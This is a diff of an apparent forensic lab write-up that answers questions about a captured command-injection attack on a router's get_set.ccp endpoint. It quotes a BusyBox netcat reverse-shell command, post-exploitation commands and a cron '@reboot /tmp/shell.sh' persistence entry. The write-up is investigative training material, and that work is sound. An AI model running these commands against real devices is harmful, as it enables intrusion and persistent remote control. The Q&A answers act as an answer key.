@@ -66,6 +66,7 @@ All exploitation traffic originated from the same internal host.
 **Answer:**  
 `192.168.10.2`
 
+
 **Evidence:**  
 <img width="1031" height="432" alt="attacker-source-ip-" src="https://github.com/user-attachments/assets/19085863-e75b-4dcc-b9af-fdd198f7d070" />
 
@@ -83,7 +84,12 @@ http.request.method == "POST"
 Repeated requests targeting a specific configuration endpoint were observed during exploitation.
 
 **Answer:**  
+
+
 http://192.168.10.1/get_set.ccp
+
+
+
 **Evidence:**  
 <img width="930" height="136" alt="vulnerable-endpoint-get-set-ccp" src="https://github.com/user-attachments/assets/e5596e2f-5ec2-4eb3-a503-bd540f3cfb95" />
 
@@ -100,6 +106,7 @@ One configuration parameter contained injected shell commands, indicating insuff
 
 **Answer:**  
 lanHostCfg_HostName_1.1.1.0
+
 **Evidence:**  
 <img width="1538" height="836" alt="command-injectionparameter" src="https://github.com/user-attachments/assets/9495d035-df83-423b-8aa3-e5c9677cd6ac" />
 
@@ -130,6 +137,7 @@ The earliest confirmed command execution created a directory on the filesystem.
 
 **Answer:**  
 mkdir test
+
 **Evidence:**  
 <img width="1516" height="838" alt="initial-command-mkdir-test" src="https://github.com/user-attachments/assets/30f21a2e-2bf2-4b00-827b-f660c053f1b1" />
 
@@ -158,6 +166,7 @@ Multiple failed attempts were observed before a successful payload using BusyBox
 
 **Answer:**  
 busybox nc 192.168.10.2 4444 -e /bin/sh
+
 **Evidence:**  
 <img width="1512" height="813" alt="reverse-shell-command" src="https://github.com/user-attachments/assets/3b43369e-f784-411c-bc61-b1f272640acc" />
 
@@ -190,6 +199,7 @@ Commands issued immediately after shell access were reconstructed from the TCP s
 
 **Answer:**  
 whoami
+
 **Evidence:**  
 <img width="1549" height="842" alt="post-exploitation-whoami" src="https://github.com/user-attachments/assets/6074172d-a1db-40de-b2b7-b1e2994e13dd" />
 
@@ -205,8 +215,10 @@ The attacker modified cron configuration to ensure execution on reboot.
 
 **Answer:**  
 @reboot /tmp/shell.sh
+
 **Evidence:**  
 <img width="1044" height="828" alt="cron-persistence-reboot" src="https://github.com/user-attachments/assets/522245cd-c51a-4f38-9a78-aa44fbce7dd9" />
 
 ---
+
 
